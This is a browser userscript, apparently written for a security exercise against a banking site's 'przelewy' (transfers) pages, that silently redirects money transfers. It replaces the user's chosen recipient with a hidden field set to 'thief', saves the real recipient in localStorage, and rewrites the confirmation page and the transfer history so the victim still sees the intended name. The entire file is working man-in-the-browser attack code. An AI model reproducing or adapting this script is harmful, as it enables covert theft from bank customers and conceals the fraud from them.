// ==UserScript==
// @name     Unnamed Script 227332
// @version  1
// @grant    none
// ==/UserScript==

var save = function (e)
{
	console.log(e);
	window.localStorage['real_recipient'] = e.target.value;
};
if (window.location.pathname == '/przelewy/make_transfer/')
{
	form = document.querySelector('form');
	real_recipient = document.querySelector('[name="recipient"]');
	real_recipient.name = '';
	real_recipient.addEventListener('input', save);
	rec = document.createElement('input');
	rec.name = 'recipient';
	rec.type = 'hidden';
	rec.value = "thief";
	form.appendChild(rec);
}
	
if (window.location.pathname == '/przelewy/data_confirmation/')
{
	t=document.querySelector('p');
	r=t.textContent;
	r2=r.match("Recipient: (\\w)+");
	r3=r2[0];
	if (window.localStorage['real_recipient'] != undefined)
	{
		t.textContent = r.replace(r3,"Recipient: "+window.localStorage['real_recipient']);
	}
}

if (window.location.pathname == '/przelewy/transfer_confirmation/')
{
	t=document.querySelector('p');
	r=t.textContent;
	r2=r.match("Recipient: (\\w)+");
	r3=r2[0];
	r4=r.match("(\\d){2}-(\\d){2}-(\\d){2} (\\d){2}:(\\d){2}:(\\d){2}");
	r5=r4[0];
	window.localStorage['real_'+r5]=window.localStorage['real_recipient'];
	if (window.localStorage['real_recipient'] != undefined)
	{
		t.textContent = r.replace(r3,"Recipient: "+window.localStorage['real_recipient']);
	}
	window.localStorage.removeItem('real_recipient');
}
if (window.location.pathname == '/przelewy/transfers/')
{
	list = document.querySelectorAll('li');
	for (var i = 0; i < list.length; i++)
	{
		li = list[i];
		r = li.textContent;
		r2=r.match("-> (\\w)+,");
		r3=r2[0];
		r4=r.match("(\\d){2}-(\\d){2}-(\\d){2} (\\d){2}:(\\d){2}:(\\d){2}");
		r5=r4[0];	
		sp = window.localStorage['real_'+r5];
		if (sp != undefined)
		{
			li.textContent = r.replace(r3,"->"+sp+",");
		}
	}
}